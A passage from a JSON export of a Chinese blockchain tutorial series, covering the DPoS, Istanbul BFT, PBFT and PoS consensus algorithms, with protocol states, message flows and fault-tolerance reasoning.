我们估计这种攻击的可能性足够接近0，经济后果也微不足道，不值得担心。\n⑥：不足法定区块生产者\n在一些不太可能的情况下，生产者没有明确达到法定人数，少数人可能继续生产块。在继续生产的区块中，利益相关者可以包含一些改变投票的交易。这些投票会选举一组新的区块生产者，并将区块生产参与度恢复到100%。一旦发生这种情况，少数人链最终会超过其它低于100%参与链。\n在这个流程发生时，所有的观察者必须要明白整个网络处于不稳定的状态，直到多于67%参与者出现后才会稳定下来。哪些选择在这种情景下发起交易的，与那些在比特币中接受低于6块就确认交易成功那样，冒着类似的风险。他们必须明白，存在某些情况下，共识最终会以另一个链为准。在实践中，这种情形比在比特币中接受少于3个块就确认更加安全。\n⑦：大多数据区块生产者的腐败\n如果大多数区块生产者合谋变得腐败，他们制造无限数量的分支，每一个分支都有多于2/3的大多数的签名。在这样的场景早，最后不可逆转块算法退化为最长链算法。此时最长的，获得了最大的群体认证的，将由少数的诚实节点的加入来确定。这样的情形不会持续很久，因为利益相关者会最终投票替换掉这些区块生产者。\n\nDPOS要解决的问题\n从名称上，我们也可以判断出DPoS与PoS共识是直接关联的。DPoS算法是BM根据当时PoW、PoS的不足而改进的共识算法，它的目的就是为了提高性能，也就是交易确认时间短。\n在PoS共识中，人们使用财产证明来“挖矿”，也就是说，这是任何人都可以参与的，只要你持有币，你就可以参与挖矿。但是PoS并没有解决性能问题，在这里我们直接认为提高性能就是提高TPS，如下：\n\n　　　　TPS = transactions / block_time\n\nTPS表示区块链每秒能确认的交易数， transactions 是由区块大小block_size和平均每笔交易大小决定的，而区块大小受全网网络状态network_bandwidth 限制，也是由记账节点之间物理带宽witness_performance决定的。\n记账节点的个数witness_count直接决定了物理带宽的上限，因为记账节点数量越多，则对物理带宽要求越高，对网络的稳定性要求也越高。\n要注意的一点是在DPoS中，记账节点不叫做矿工，而是改称为见证人，Witness。所以这个公式变成了下面的样子：\n\nTPS = (block_size_network_bandwidth witness_performance)/(block_time * witness_count)\n\n我们可以看到，要提高TPS，可以增大区块大小block_size、提升记账节点网络带宽network_bandwidth、提升记账节点处理性能witness_performance，减小区块时间block_time、减小记账节点数量witness_count。\n分子项我们可以看到，它基本受限于物理资源的上限，目前工业水平制造的物理资源的使用上限基本就是整个项的上限了，所以可操作性不大。\n而分母项是由共识算法决定的，所以我们从区块时间，以及记账节点数入手，DPoS算法便正是从这两项着手的。\n首先改动的便是限制记账节点的数量，也就是见证人的数量。\n我们在PoW和PoS中可以看到，成为记账节点是无需门槛的，你可以随时参与挖矿，随时退出。\n那这会带来什么问题呢，首先无法确定记账节点的数量，其次无法确定记账节点之间的网络环境，记账节点数越多网络环境越复杂，这些不确定性会增大网络分区的概率，从而导致区块链分叉。\n如果我们事先规定好记账节点的数量，接着让全网所有节点可以投票决定哪些节点可以成为记账节点，这样就限制并减小了分母项witness_count，这个过程我们也称作投票选举。\n因为记账节点数量不多，那么我们可以在共识算法中可以规定出块时间为一个固定值，这个值可以很小，通过轮流出块的方式来进行记账。\n以上思路基本就是DPoS的基本设计思路，BM还为DPoS算法确立两个原则：\n\n投票选举过程一定要保证最大权益所有者最终能控制全网，因为一旦出了问题，他们的损失最大；\n与PoW、PoS一样，所有节点仅承认“最长”链。\n\n这两个原则确立了DPoS共识的基本特性，第一条放大了PoS共识使用者就是记账者的优点，第二点则规定了分叉时系统应该表现的行为。\n\n参考\n\ngithub.com/blockchainGuide\neth.wiki/en/concepts/casper-proof-of-stake-compendium\neth.wiki/en/concepts/casper-proof-of-stake-compendium\neth.wiki/en/concepts/proof-of-stake-faqs\n"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Istanbul-BFT算法-9":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Istanbul-BFT算法-9","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Istanbul BFT算法-9.md","title":"死磕共识算法_Istanbul BFT算法-9","links":[],"tags":[],"content":"\n死磕共识算法|Istanbul BFT算法\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，上面给个star，有什么问题可以指出，便于大家交流学习。\n\n\n引言\nIstanbul BFT作为BFT类算法的一种已经有过在以太坊上的实践。虽然Istanbul目前还存在一些潜在的问题，但其算法思想和实现还是值得学习和借鉴的。\n\n源代码：github.com/jpmorganchase/quorum/tree/master/consensus/istanbul\n\n术语\n\nValidator：块的验证者\nProposer：块验证者中被选择用来出块的\nRound: 共识的轮数。一轮中 Proposer 开始提出一个一个出块建议，然后以提交区块结束。\nProposal：新的块生成提议\nSequence：提议的序号。当前序列号大于先前的；块高就是此提议的序列号。\nBacklog：存储未来的共识消息\nRound state: 特定sequence和轮次的共识消息，包括 pre-prepare 消息, prepare 消息, and commit 消息.\nConsensus proof：用来证明块已经通过共识处理的块签名\nSnapshot：上一个时期的验证者投票状态\n\nIBFT共识细节\nProposer 必须在每个 round中连续不断的 生成 block prorosal。\nistanbul BFT 包括 3 个阶段的共识：PRE-PREPARE，PREPARE，COMMIT。\n容错机制： N = 3F +1 ；N表示验证节点，F表示错误节点。\n在每轮之前将会以循环的方式选择一个 validator 作为 proposer. 接着 proposer将会提出一个新的 block proposal 并且广播通过 pre-prepare 消息。一旦接受到 pre-prepare消息 ，validators将会进入到 pre-prepared 阶段并且广播 prepare  消息。这个步骤是为了确保 validators 运行在相同的 sequence 和相同的 round 中。当接收到2F+1 的Prepare消息时，validators 进入到 prepared并且广播 commit 消息。此步骤是通知其它节点接受建议的块并将块插入链。 最后，validator等待2F + 1 COMMIT消息进入COMMITTED状态，然后将块插入链。\n注意：Istanbul中 的块是最终的，没有分叉，任何有效的块必须位于主链的某个位置。\n为了防止故障节点从主链生成完全不同的链，每个验证器将2F + 1个接收到的COMMIT签名附加到标头中的extraData字段，然后将其插入链中， 因此，块是可自我验证的，并且也可以支持轻客户端。但是，动态extraData会导致块哈希计算出现问题。由于来自不同验证器的相同块可以具有不同的COMMIT签名集，因此同一块也可以具有不同的块散列。 为了解决这个问题，我们通过排除COMMIT签名部分来计算块哈希。 因此，我们仍然可以保持块/块哈希一致性，并将共识证明放在块头中。\n共识状态\nIstanbul BFT是一种状态机复制算法。 每个验证器都维护一个状态机副本，以达到块一致性。\n一共有以下几种状态：\n\nNEW ROUND: Proposer发送新的 block proposal。 Validator等待PRE-PREPARE消息。\nPRE-PREPARED:验证器已收到PRE-PREPARE消息并广播PREPARE消息。 然后它等待2F + 1 个PREFARE或COMMIT消息。\nPREPARED: 验证器已收到2F + 1个PREPARE消息并广播COMMIT消息。 然后它等待2F + 1 COMMIT消息。\nCOMMITTED:验证器已收到2F + 1个COMMIT消息，并能够将建议的块插入区块链。\nFINAL COMMITTED:新块已成功插入区块链，validator 已准备好进入下一轮。\nROUND CHANGE:验证器正在等待同一个建议的轮数上的2F + 1个ROUND CHANGE消息。\n\n状态转换\n\n\nNEW ROUND → PRE-PREPARED:\n\nProposer 从txpool 中收集交易\nProposer生成块提议并将其广播给验证者。 然后它进入PRE-PREPARED状态。\n每个validator在收到具有以下条件的PRE-PREPARE消息后进入PRE-PREPARED：\n\n块提案来自有效的proposer。\n块头有效\nblock proposal的sequence和round匹配validator的状态\n\n\nValidator广播PREPARE消息给其他validators\n\n\nPRE-PREPARED → PREPARED:\n\nValidator接收2F + 1个有效的PREPARE消息以进入PREPARED状态。 有效消息符合以下条件：\n\nsequence 和 round匹配\nblock hash匹配\n消息来自于已知 validators\n\n\n\n\nCOMMITTED → FINAL COMMITTED:\n\nvalidator 将 2F+1 个提交的签名放到 extraData中并且尝试将区块上链\n插入成功后，Validator进入FINAL COMMITTED状态。\n\n\nFINAL COMMITTED → NEW ROUND:\n\n验证器选择一个新的提议器并启动一个新的round timer 。\n\n\n\nRound change flow\n\n3 个条件将会触发 ROUND CHANGE\n\nRound change timer 过期\n无效 PREPREPARE 消息\n块插入失败\n\n\n当验证器注意到上述条件之一适用时，它会广播ROUND CHANGE消息以及建议的 round number，并等待来自其他验证器的ROUND CHANGE消息。 建议的round number 根据以下条件选择：\n\n如果验证器已从其peers接收到ROUND CHANGE消息，则它将选择具有F + 1个ROUND CHANGE消息的最大 round number。\n否则，它会选择1 +当前的round number作为建议的轮数。\n\n\n每当验证器在同一个建议的轮数上收到F + 1个ROUND CHANGE消息时，它就会将收到的消息与它自己的一个进行比较。 如果接收的数量较大，验证器将再次使用收到的号码广播ROUND CHANGE消息。\n在相同的建议round number上接收到2F + 1个ROUND CHANGE消息后，验证器退出round change loop，计算新的提议者，然后进入NEW ROUND状态。\n验证器跳出round change loop的另一个条件是它通过对等同步接收验证的块。\n\nProposer 选择策略\n目前我们支持两种策略：round robin 和 sticky proposer.。\n\nRound robin:在循环设置中，提议者将在每个块和round change中进行更改\nSticky proposer: 在 sticky proposer中, proposal只有在发生一轮变更时才会改变。\n\nValidator 列表投票\n使用与Clique类似的验证器投票机制，并复制Clique EIP的大部分内容。 每个epoch交易都会重置验证器投票，这意味着如果授权或取消授权投票仍在进行中，则投票过程将被终止。\n对于所有交易块：\n\nProposer可以投一票来建议更改验证人名单。\n每个目标受益人的最新提案仅保留一个验证人。\n随着链条的进展，投票将被实时统计（允许同时提议）。\n达到多数共识的proposals ,VALIDATOR_LIMIT立即生效。\n无效的提案不会因客户端实现简单而受到惩罚。\n一项生效的提案需要放弃该提案的所有未决投票（赞成和反对），并以 clean state 开始\n\n未来的消息和backlog\n在异步网络环境中，可以接收将来无法在当前状态下处理的消息。 例如，验证器可以在NEW ROUND上接收COMMIT消息。 我们将此类消息称为“未来消息”。 当验证程序收到将来的消息时，它会将消息放入其待办事项中，并尽可能在稍后尝试处理。\n优化\n为了加速共识过程，在接收PREFARE消息的2F + 1之前接收到2F + 1 COMMIT消息的验证器将跳转到COMMITTED状态，这样就不必等待进一步的PREPARE消息。\n常量\n我们定义以下常量：\n\nEPOCH_LENGTH:检查点和重置待处理投票之后的块数。\n\n建议30000使testnet保持类似于主要网络ethash时代。\n\n\nREQUEST_TIMEOUT: 在以毫秒为单位进行轮次更改之前，每个达成一致的超时。\nBLOCK_PERIOD: 两个连续块之间的最小时间戳差异（秒）。\nPROPOSER_POLICY:提议者选择策略，默认为round robin.。\nISTANBUL_DIGEST:固定的 magic number， 0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365用于Istanbul块识别的块头中的mixDigest。\nDEFAULT_DIFFICULTY: 默认块难度，设置为0x0000000000000001。\nEXTRA_VANITY: 固定数量的额外数据前缀字节预留给提议者。\n\n建议保留当前额外数据容量和/或使用的32个字节。\n\n\nNONCE_AUTH: magic nonce number 0xffffffffffffffff投票添加验证器。\nNONCE_DROP:magic nonce number 0x0000000000000000 投票移除验证器\nUNCLE_HASH:总是Keccak256（RLP（[]））作为叔叔在PoW之外没有意义。\nPREPREPARE_MSG_CODE: 固定编号0. PREPREPARE消息的消息代码。\nCOMMIT_MSG_CODE: 固定编号1. COMMIT消息的消息代码。\nROUND_CHANGE_MSG_CODE:固定号码2. ROUND CHANGE消息的消息代码。\n\n我们还定义了以下每块常量：\n\nBLOCK_NUMBER: 链中的块高度，其中生成块的高度为0。\nN: 授权验证人数。\nF:允许的错误验证器数量。\nVALIDATOR_INDEX:当前授权验证器的排序列表中的块验证器的索引。\nVALIDATOR_LIMIT: 传递授权或取消授权提议的验证者数量。\n\n必须是最低限额（N / 2）+ 1才能对链条达成多数共识。\n\n\n\n块头\n我们没有为伊斯坦布尔BFT发明新的块头。 相反，我们跟随Clique重新调整ethash标头字段，如下所示：\n\n\nbeneficiary: 建议修改验证器列表的地址。\n\n应该通常用零填充，仅在投票时修改。\n尽管如此，允许使用任意值（即使是无意义的值，例如投票给非验证者），以避免投票机制实施中的额外复杂性。\n\n\n\nnonce:关于受益人领域定义的帐户的提议者提案。\n\n应该是NONCE_DROP建议取消授权受益人作为现有验证人。\n应该是NONCE_AUTH建议授权受益人作为新的验证人。\n必须填充零，NONCE_DROP或NONCE_AUTH\n\n\n\nmixHash: 固定 magic number 0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365 用于伊斯坦布尔区块识别\n\n\nommersHash:必须是UNCLE_HASH，因为在PoW之外，叔叔没有意义。\n\n\ntimestamp:必须至少是父时间戳+ BLOCK_PERIOD\n\n\ndifficulty:必须填写0x0000000000000001。\n\n\nextraData: 签名者和RLP编码的伊斯坦布尔额外数据的组合字段，其中伊斯坦布尔额外数据包含验证器列表，proposer seal和 commit seal。 伊斯坦布尔的额外数据定义如下：\n type IstanbulExtra struct {\n \tValidators    []common.Address \t//Validator addresses\n \tSeal          []byte\t\t\t//Proposer seal 65 bytes\n \tCommittedSeal [][]byte\t\t\t//Committed seal, 65 * len(Validators) bytes\n }\n因此extraData将采用EXTRA_VANITY |的形式 ISTANBUL_EXTRA其中| 表示用于分隔vanity和伊斯坦布尔额外数据的固定索引（不是分隔符的实际字符）。\n\n第一个EXTRA_VANITY字节（固定）可以包含任意提议者vanity数据。\nISTANBUL_EXTRA字节是从RLP（IstanbulExtra）计算的RLP编码的伊斯坦布尔额外数据，其中RLP（）是RLP编码功能，而IstanbulExtra是伊斯坦布尔额外数据。\n\nValidators: 验证器列表，必须按升序排序。\nSeal: 提议者的header seal 签名。\nCommittedSeal:提交的签名列表作为共识证明\n\n\n\n\n\nBlock hash, proposer seal, and committed seals\n由于以下原因，Istanbul块哈希计算与ethash块哈希计算不同：\n\n提议者需要将提议者密封在extraData中以证明该块由所选提议者签名。\n验证者需要将2F + 1个已提交的密封作为extraData中的共识证明，以证明该块已经达成共识。\n\n计算仍然类似于ethash块哈希计算，但我们需要处理extraData。 我们按如下方式计算字段：\n计算提议者seal\n在提议者密封计算时，committed的密封仍然是未知的，因此我们计算密封与那些未知的密封空。 计算如下：\n\nProposer seal: SignECDSA(Keccak256(RLP(Header)), PrivateKey)\nPrivateKey: Proposer’s的私钥\nHeader: 和ethash 的header一样，只不过extradata不一样\nextraData: vanity | RLP(IstanbulExtra), 在IstanbulExtra, CommittedSealand Seal` 是空数组.\n\n计算块哈希\n在计算块哈希时，我们需要排除已提交的密封，因为该数据在不同的验证器之间是动态的。 因此，我们在计算哈希时使CommittedSeal为空数组。 计算如下：\n\nHeader: 和ethash 的header一样，只不过extradata不一样\nextraData: vanity | RLP(IstanbulExtra), 在IstanbulExtra, CommittedSealand Seal` 是空数组.\n\n共识证明\n在将块插入区块链之前，每个验证器需要从其他验证器收集2F + 1个已提交的密封以构成共识证明。 一旦它收到足够的提交密封，它将填充IstanbulExtra中的CommittedSeal，重新计算extraData，然后将块插入区块链。 请注意，由于已提交的密封可能因不同的来源而不同，因此我们会在计算块哈希时排除该部分，如上一节所述。\nCommitted seal calculation:\ncommitted seal由每个签名哈希的验证器以及其私钥的COMMIT_MSG_CODE消息代码计算。 计算如下：\n\nCommitted seal: SignECDSA(Keccak256(CONCAT(Hash, COMMIT_MSG_CODE)), PrivateKey).\nCONCAT(Hash, COMMIT_MSG_CODE): 连接 block hash and COMMIT_MSG_CODE bytes.\nPrivateKey: 签署验证者的私钥。\n\n块锁定机制\n引入锁定机制以解决安全问题。 通常，当提议者用块B锁定在某个高度H时，它只能为高度H提出B.另一方面，当验证器被锁定时，它只能在B上投票选择高度H.\nLock\n锁定锁（B，H）包含一个块及其高度，这意味着它的所有验证器当前被锁定在某个块B和高度H.在下面，我们还使用+表示多于和 - 表示小于。 例如，+ 2/3验证器表示超过三分之二的验证器，而-1/3验证器表示不到三分之一的验证器。\nLock and unlock\n\nLock:验证器在高度为“H”的块“B”上接收到“2F + 1”“PREPARE”消息时被锁定。\nUnlock: 验证器在高度“H”处解锁，并在未能将块“B”插入块链时阻止“B”。\n\nProtocol (+2/3 validators are locked with Lock(B,H))\n\n\nPRE-PREPARE:\n\n\nProposer:\n\n\n情况1，提议者被锁定：在B上广播PRE-PREPARE，并进入PREPARED状态。\n\n\n情况2，提议者未被锁定：在块B’上广播PRE-PREPARE。\n\n\n\n\nValidator:\n\n情况1，在现有块上接收PRE-PREPARE：忽略。\n\n注意：它最终会导致轮次更改，并且提议者将通过同步获得旧块。\n\n\n情况2，验证器被锁定：\n\n案例2.1，在B上收到PRE-PREPARE：在B上广播PREPARE\n案例2.2，在B’上接收PRE-PREPARE：广播ROUND CHANGE。\n\n\n情况3，验证器未锁定：\n\n情况3.1，在B上接收PRE-PREPARE：在B上广播PREPARE\n案例3.2，在B’上接收PRE-PREPARE：在B’上广播PREPARE。\n\n注意：由于+2/3被锁定在B并且这将导致全面更改，因此此共识轮将最终进行全面更改。\n\n\n\n\n\n\n\n\n\nPREPARE:\n\n案例1，验证器被锁定：\n\n情况1.1，在B上接收PREPARE：在B上广播COMMIT，并进入PREPARED状态。\n\n注意：这不应该发生，它应该跳过这一步并在PRE-PREPARE阶段输入PREPARED。\n\n\n案例1.2，在B’上收到PREPARE：忽略。\n\n注意：B’上不应该有+1/3 PREPARE，因为+2/3被锁定在B.因此B’上的共识轮将导致轮次更改。 验证器不能直接在此广播ROUND CHANGE，因为此PREPARE消息可能来自故障节点。\n\n\n\n\n情况2，验证器未锁定：\n\n情况2.1，在B上收到PREPARE：在B上等待2F + 1 PREPARE消息\n\n注意：在接收2F + 1 PREPARE消息之前，它很可能会收到2F + 1 COMMIT消息，因为有+2/3验证器被锁定在B.在这种情况下，它将直接跳转到COMMITTED状态。\n\n\n情况2.2，在B’上收到PREPARE：在B’上等待2F + 1 PREPARE消息。\n\nNote: This consensus will eventually get into round change since +2/3 validators are locked on B and which would lead to round change.\n\n\n\n\n\n\n\nCOMMIT:\n\n验证者必须被锁定：\n\n情况1，在B上收到COMMIT：等待2F + 1 COMMIT消息。\n案例2，B’收到COMMIT：不应该发生。\n\n\n\n\n\n锁定情况下\n\nRound change:\n\nCase 1, +2/3 are locked:\n\n如果提议者被锁定，则建议B.\n否则它会提出B’，但这将导致另一轮变革。\n结论：最终B将由诚实的验证者承诺。\n\n\nCase 2, +1/3 ~ 2/3 are locked:\n\n如果提议者被锁定，则建议B.\n否则它会提出B’。 但是，由于+1 / 3被锁定在B，因此没有验证器可以在B’上接收2F + 1 PREPARE，这意味着没有验证器可以锁定在B’。 此外，那些+1 / 3锁定验证器将不会响应B’并最终导致全面更改。\n结论：最终B将由诚实的验证者承诺。\n\n\nCase 3, -1/3 are locked:\n\n如果提议被锁定，则建议B.\n否则它会提出B’。 如果+2/3在B’上达成共识，那些锁定的-1/3将通过同步获得B’并移动到下一个高度。 否则，将会有另一轮变更。\n结论：它可以是B或其他块B’最终提交。\n\n\n\n\n插入失败导致的round change：\n\n它将属于上述一轮变更案例之一。\n\n如果块实际上是坏的（不能插入区块链），最终+2/3验证器将在H处解锁块B并尝试建议新的块B’。\n如果块是好的（可以插入区块链），那么它仍然是上述圆形更改案例之一。\n\n\n\n\n-1/3验证器成功插入块，但其他验证器成功触发循环更改，这意味着+1 / 3仍锁定在锁定（B，H）\n\n案例1，提议者已插入B：提议者将在H’提出B’，但+1 / 3被锁定在B，因此B’将不会通过共识，这最终将导致轮次更改。 其他验证器将对B执行共识或通过同步获得B.\n案例2，提议者未插入B：\n\n案例2.1，提议者被锁定：提议者提出B.\n案例2.2，提议者未被锁定：提议者将在H处提出B’。其余与上述案例1相同。\n\n\n\n\n+1/3验证器成功插入块，-2 / 3试图在H处触发圆形更改\n\n案例1，提议者已插入B：提议者将在H’提出B’，但在+1/3通过同步获得B之前不会通过共识。\n案例2，提议者未插入B：\n\n案例2.1，提议者被锁定：提议者提出B.\n案例2.2，提议者未被锁定：提议者在H处提出B’。其余与上述案例1相同。\n\n\n\n\n+2/3验证器成功插入块，-1 / 3试图在H处触发圆形更改\n\n案例1，提议者已插入B：提议者将在H’提出B’，这可能会导致成功的共识。 然后那些-1/3需要通过同步获得B.\n案例2，提议者未插入B：\n\n案例2.1，提议者被锁定：提议者提出B.\n案例2.2，提议者没有被锁定：提议者在H处建议B’。因为+2/3已经在H处有B，所以这一轮将导致轮次改变。\n\n\n\n\n\n存在的问题\n\nFail-Stop failures\n这篇文章详细分析了IBFT\n没有激励机制\n\n传统上，验证者需要紧密连接才能达到稳定的共识结果，这意味着所有验证者需要彼此直接连接; 但是，在实际的网络环境中，很难实现稳定和恒定的p2p连接。 为了解决这个问题，伊斯坦布尔BFT实施了八卦网络来克服这种限制。 在八卦网络环境中，所有验证器只需要弱连接，这意味着当它们直接连接或者它们之间连接有一个或多个验证器时，任何两个验证器都会被连接。 共识消息将在验证器之间中继。\n\n参考\n\ngithub.com/blockchainGuide （文章合集最终修订版，会因为文章内容勘误不断更新，建议关注）\narxiv.org/pdf/1901.07160.pdf （IBFT论文）\ngithub.com/ethereum/EIPs/issues/650\ngithub.com/ConsenSys/quorum/issues/305\ndocs.goquorum.consensys.net/en/stable/Concepts/Consensus/IBFT/ （quorum的官方的文档）\n"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_PBFT算法-8":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_PBFT算法-8","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_PBFT算法-8.md","title":"死磕共识算法_PBFT算法-8","links":[],"tags":[],"content":"\n死磕共识算法|实用拜占庭容错算法(PBFT)\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n\n拜占庭容错BFT\n拜占庭容错是分布式协议的一种属性，如果这种协议可以解决不可信任环境下的分布式一致性问题，那么它就是拜占庭容错。\npbft 算法的提出主要是为了解决拜占庭将军问题。网上关于 pbft 的算法介绍基本上是基于 liskov 在 1999 年发表的论文《 Practical Byzantine Fault Tolerance 》来进行解释的。\nraft和pbft的最大容错节点数\n对于raft算法，raft算法只支持容错故障节点，不支持容错作恶节点。假设集群总节点数为n，故障节点为 f ，集群里正常节点只需要比 f 个节点再多一个节点，即 f+1 个节点，正确节点的数量就会比故障节点数量多，那么集群就能达成共识。因此 raft 算法支持的最大容错节点数量是（n-1）/2。\n对于 pbft 算法，因为 pbft 算法的除了需要支持容错故障节点之外，还需要支持容错作恶节点。假设集群节点数为 N，有问题的节点为 f。有问题的节点中，可以既是故障节点，也可以是作恶节点，或者只是故障节点或者只是作恶节点。那么会产生以下两种极端情况：\n\n第一种情况，f 个有问题节点既是故障节点，又是作恶节点，那么根据小数服从多数的原则，集群里正常节点只需要比f个节点再多一个节点，即 f+1 个节点，确节点的数量就会比故障节点数量多，那么集群就能达成共识。也就是说这种情况支持的最大容错节点数量是 （n-1）/2。\n第二种情况，故障节点和作恶节点都是不同的节点。那么就会有 f 个问题节点和 f 个故障节点，当发现节点是问题节点后，会被集群排除在外，剩下 f 个故障节点，那么根据小数服从多数的原则，集群里正常节点只需要比f个节点再多一个节点，即 f+1 个节点，确节点的数量就会比故障节点数量多，那么集群就能达成共识。所以，所有类型的节点数量加起来就是 f+1 个正确节点，f个故障节点和f个问题节点，即 3f+1=n。\n\n结合上述两种情况，因此 pbft 算法支持的最大容错节点数量是（n-1）/3。\nPBFT算法流程\n基本流程如下：\n\n客户端发送请求给主节点 \n主节点广播请求给其它节点，节点执行 pbft 算法的三阶段共识流程。\n节点处理完三阶段流程后，返回消息给客户端。\n客户端收到来自 f+1 个节点的相同消息后，代表共识已经正确完成。\n\n无论是最好的情况还是最坏的情况，如果客户端收到 f+1 个节点的相同消息，那么就代表有足够多的正确节点已全部达成共识并处理完毕了。\nPBFT 算法中, 存在一个主节点(primary) 和其他的备份节点 (replica), PBFT 共识机制主要包含两部分: 第一部分是分布式共识达成,在主节点正常工作时, PBFT 通过预准备 (pre-prepare)、准备 (prepare) 和承诺 (commit) 三个步骤完成共识; 第二部分是视图转换 (view-change), 当主节点出现问题不能及时处理数据请求时, 其他备份节点发起视图转换, 转换成功后新的主节点开始工作. 主节点以轮转 (round robin) 的方式交替更换.\nPBFT 的分布式共识达成过程如下:\n\n请求 (propose)：客户端 (client) 上传请求消息 m 至网络中的节点, 包括主节点和其他备份节点。\n预准备 (pre-prepare)：主节点收到客户端上传的请求消息 m, 赋予消息序列号 s, 计算得到预准备消息 (pre-prepare*, H*(m), s, v)，其中 H(m) 是单向哈希函数, v 代表的是此时的视图 (view),视图一般用于记录主节点的更替, 主节点发生更替时, 视图随之增加 1 。消息发送者节点在发送消息前需利用自身私钥对消息实施数字签名。主节点将预准备消息发送给其他备份节点.\n准备 (prepare)：备份节点收到主节点的预准备消息, 验证 H(m) 的合法性。即对于视图 v 和序列号s 来说, 备份节点先前并未收到其他消息。验证通过后, 备份节点计算准备消息 (prepare*, H*(m), s, v) 并将其在全网广播. 与此同时, 所有节点收集准备消息,如果收集到的合法准备消息数量大于等于 2f + 1(包含自身准备消息) 个, 则将其组成准备凭证 (prepared certificate)\n承诺 (commit)：如果在准备阶段中, 节点收集到足够的准备消息并生成了准备凭证, 那么节点将计算承诺消息 (commit*, s, v*) 并广播，将消息 m 放入到本地日志中. 与此同时节点收集网络中的承诺消息,如果收集到的合法承诺消息数量大于等于 2f +1(包含自身承诺消息), 那么将其组成承诺凭证 (committedcertificate), 证明消息 m 完成最终承诺。\n答复 (reply)：备份节点和主节点中任意收集到足够承诺消息并组成承诺凭证的节点, 将承诺凭证作为对消息 m 的答复发送给客户端, 客户端确认消息 m 的最终承诺.\n\nPBFT的共识过程如下：\n\ncheckpoint机制\n在 PBFT 中, 存在检查点 (checkpoint) 机制, 由于每个消息都被赋予了一定的序列号, 如消息 m 对应的序列号为 118, 当不少于 2f + 1 个节点组成消息 m 的承诺凭证, 完成消息承诺之后, 序列号 118 成为当前的稳定检查点 (stable checkpoint). 检查点机制被用于实现存储删减, 即当历史日志内容过多时, 节点可以选择清除稳定检查点之前的数据, 减少存储成本. 另外稳定检查点在 PBFT 的视图转换中也起到了关键作用.\nviewChange机制\n当主节点挂了（超时无响应）或者从节点集体认为主节点是问题节点时，就会触发 ViewChange 事件， ViewChange 完成后，视图编号将会加 1 。下图展示 ViewChange 的三个阶段流程：\n\nviewchange 会有三个阶段，分别是 view-change ， view-change-ack 和 new-view 阶段。从节点认为主节点有问题时，会向其它节点发送 view-change 消息，当前存活的节点编号最小的节点将成为新的主节点。当新的主节点收到 2f 个其它节点的 view-change 消息，则证明有足够多人的节点认为主节点有问题，于是就会向其它节点广播 New-view 消息。注意：从节点不会发起 new-view 事件。对于主节点，发送 new-view 消息后会继续执行上个视图未处理完的请求，从 pre-prepare 阶段开始。其它节点验证 new-view 消息通过后，就会处理主节点发来的 pre-prepare 消息，这时执行的过程就是前面描述的 pbft 过程。\n最后一张图来了解一下PBFT算法：\n\n\n参考\n\ngithub.com/blockchainGuide\npmg.csail.mit.edu/papers/osdi99.pdf\nblog.csdn.net/shangsongwww/article/details/88942215\nwww.microsoft.com/en-us/research/wp-content/uploads/2017/01/thesis-mcastro.pdf\nwww.comp.nus.edu.sg/~rahul/allfiles/cs6234-16-pbft.pdf\nzhuanlan.zhihu.com/p/35847127\nwww.jianshu.com/p/0bef4fb1662b\nlearnblockchain.cn/article/781（为什么需要三阶段消息）\nlessisbetter.site/2020/03/22/why-pbft-needs-viewchange/（View Change的作用）\n"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_POS算法-2":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_POS算法-2","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_POS算法-2.md","title":"死磕共识算法_POS算法-2","links":[],"tags":[],"content":"\n死磕共识算法|POS算法\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n\n为什么会出现PoS?\n​    在比特币系统中采用了PoW(工作量证明）算法,PoW其实就是由所有的节点相互竞争，提交一个难于计算但是容易验证的计算结果，任何节点都可以验证这个这个结果的正确性，验证通过即算这个节点完成了大量的计算工作。\n​    然而PoW机制存在明显的弊端。 一是算力不公平，矿场的竞争力比单个节点大，还有就是随着硬件的发展，特别是量子计算机的出现，可能几秒就破解了Hash。 二是PoW算法太浪费了，比特币网络每秒可完成数百万亿次SHA256计算， 但这些计算除了使恶意攻击者不能轻易地伪装成几百万个节点和打垮比特币网络，并没有更多实际或科学价值。\n​    鉴于以上问题，POS股权证明诞生了。\nPoS股权证明\n​    权益证明（ Proof of Stake，PoS） ，最早在 2013 年被提出，最早在 Peercoin 系统中被实现，类似现实生活中的股东机制，拥有股份越多的人越容易获取记账权（ 同时越倾向于维护网络的正常工作） 。\n​    典型的过程是通过保证金（ 代币、资产、名声等具备价值属性的物品） 来对赌一个合法的块成为新的区块，收益为抵押资本的利息和交易服务费。提供证明的保证金（ 例如通过转账货币记录） 越多，则获得记账权的概率就越大。合法记账者可以获得收益。\n​    恶意参与者将存在保证金被罚没的风险，即损失经济利益。一般的，对于 PoS 来说，需要掌握超过全网 1/3 的资源，才有可能左右最终的结果。这个也很容易理解，三个人投票，前两人分别支持一方，这时候，第三方的投票将决定最终结果。\n​    在股权证明模式下， 有一个名词叫币龄， 每个币每天产生1币龄， 例如，你持有 100 个币， 总共持有了 30 天， 那么， 此时你的币龄就为 3000， 这个时候， 如果你发现了一个PoS区块， 你的币龄就会被清空为 0。 你每被清空 365币龄， 你将会从区块中获得0.05个币的利息（ 可以理解为年利率5%） ， 那么在这个案例中， 利息=3000×5%/365=0.41个币。\n​    以现有的比特币运行发展情况来看， 比特币每年的挖矿产量都在不断减半， 我们可以预计， 随着比特币产量的不断降低， 矿工人数也会越来越少， 这样就会导致整个比特币网络的稳定性出现问题。 PoS的解决方案是鼓励大家都去打开钱包客户端程序， 因为只有这样才可以发现PoS区块， 才会获得利息， 这也增加了网络的健壮性。还有当矿工数量变少的时候，比特币被51%算力攻击就越容易。\nPoS 